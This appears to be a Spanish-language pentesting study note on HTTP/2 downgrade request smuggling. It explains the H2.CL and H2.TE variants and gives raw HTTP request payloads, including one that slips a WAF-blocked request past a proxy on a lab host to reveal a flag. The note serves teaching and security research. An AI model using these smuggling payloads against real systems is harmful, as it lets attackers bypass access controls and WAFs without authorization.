---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - HTTP/H2
Descripción: "El HTTP/2 Downgrading ocurre cuando el cliente habla HTTP/2 con el proxy inverso, pero el proxy habla HTTP/1.1 con el servidor"
Fecha de actualización: 2026-07-14
Nota previa: "[[13 - Introducción a HTTP2]]"
Nota siguiente: "[[15 - Más vulnerabilidades HTTP2]]"
Area: "[[HTTP Attacks.base|HTTP Attacks]]"
---
---

El **HTTP/2 Downgrading** ocurre cuando el cliente habla [[13 - Introducción a HTTP2|HTTP/2]] con el proxy inverso, pero el proxy habla **HTTP/1.1** con el servidor. El proxy tiene que **reescribir** cada petición HTTP/2 a HTTP/1.1 — y <mark style="background: #ADCCFFA6;">esa reescritura reintroduce la ambigüedad `CL`/`TE`</mark> que HTTP/2 había eliminado. El resultado: smuggling incluso usando el "seguro" HTTP/2.

¿Por qué existiría este setup? El back-end aún no soporta HTTP/2, una misconfiguración, o el comportamiento por defecto del proxy. Sea como sea, es **común** en el mundo real.

# La ventaja del atacante en HTTP/2

Al reescribir de HTTP/2 (donde la longitud va en los **DATA frames binarios**) a HTTP/1.1 (donde va en `CL`/`TE`), el proxy tiene que **añadir** o **confiar** en una cabecera de longitud. La grieta: <mark style="background: #FFB86CA6;">HTTP/2 permite al atacante enviar valores que un cliente HTTP/1.1 no podría</mark> — un `content-length` que **no coincide** con el tamaño real de los frames, o una `transfer-encoding` prohibida. Si el proxy no valida y arrastra ese valor mentido a HTTP/1.1, se produce la desync.

# H2.CL: mentir el Content-Length

El RFC de HTTP/2 **permite** el `content-length`, pero exige que sea **correcto** (igual a la suma de los DATA frames). Si el proxy **no valida** esa correspondencia y usa el CL mentido al reescribir:

```text
# Petición HTTP/2 del atacante (CL mentido a 0)
:method POST · :path / · :authority http2.htb · :scheme http
content-length 0
<body> GET /smuggled HTTP/1.1
       Host: http2.htb
```

El proxy la reescribe a HTTP/1.1 confiando en `Content-Length: 0`:

```http
POST / HTTP/1.1
Host: http2.htb
Content-Length: 0

GET /smuggled HTTP/1.1
Host: http2.htb
```

Como el proxy cree que el cuerpo tiene **0 bytes**, para él solo hay un `POST /`. Pero al servidor le llega el stream con **dos** peticiones → el `GET /smuggled` se coló **pasando el proxy**. Es una **H2.CL**.

# H2.TE: colar un Transfer-Encoding prohibido

El RFC dice que `chunked` **MUST NOT** usarse en HTTP/2. Pero si el proxy **acepta** un `transfer-encoding: chunked` en la petición HTTP/2 y lo arrastra al reescribir:

```text
# Petición HTTP/2 del atacante
:method POST · :path / · :authority http2.htb
transfer-encoding chunked
<body> 0
       GET /smuggled HTTP/1.1
       Host: http2.htb
```

El proxy reescribe añadiendo su propio `CL` **y** manteniendo el `TE`:

```http
POST / HTTP/1.1
Host: http2.htb
Transfer-Encoding: chunked
Content-Length: 48

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

El servidor, en HTTP/1.1, da **precedencia al `TE`** → la primera petición termina en el chunk vacío `0` → el `GET /smuggled` es una petición aparte. Es una **H2.TE**.

# Explotación: bypass de WAF (H2.CL)

Igual que en [[09 - TE.CL|TE.CL]], se esconde la petición prohibida del WAF. El WAF bloquea `reveal_flag=1`; se cuela con H2.CL (desactiva *Update Content-Length* en Burp):

```http
POST /index.php HTTP/2
Host: http2.htb
Content-Length: 0

POST /index.php?reveal_flag=1 HTTP/1.1
Foo: 
```

El WAF (viendo `CL:0`) no ve el `reveal_flag=1`; el servidor sí lo procesa → flag revelada. Para leer la respuesta smuggled, se usan **tab groups** enviados por una sola conexión, como en el smuggling clásico. El truco del `Foo:` (dummy header) esconde la primera línea de la petición smuggled y <mark style="background: #FFB8EBA6;">el `Host` obligatorio lo aporta la petición de seguimiento</mark>.

> [!important] Por qué es tan relevante hoy
> HTTP/2 se vendió como la cura del smuggling, y lo es **extremo a extremo**. Pero la realidad de despliegue —CDN/proxy HTTP/2 delante, back-end HTTP/1.1 detrás— hace que el H2.CL/H2.TE sea <mark style="background: #FF5582A6;">uno de los vectores de smuggling **más presentes** en objetivos modernos</mark>. James Kettle lo demostró contra sitios enormes. Si un objetivo habla HTTP/2, **siempre** prueba downgrade smuggling.

La siguiente nota cubre [[15 - Más vulnerabilidades HTTP2|vulnerabilidades adicionales]] que abre la reescritura (request splitting, inyección en pseudo-headers).

## Referencias

- [James Kettle — HTTP/2: The Sequel is Always Worse (2021)](https://portswigger.net/research/http2)
- [PortSwigger — HTTP/2 request smuggling](https://portswigger.net/web-security/request-smuggling/advanced#http-2-request-smuggling)
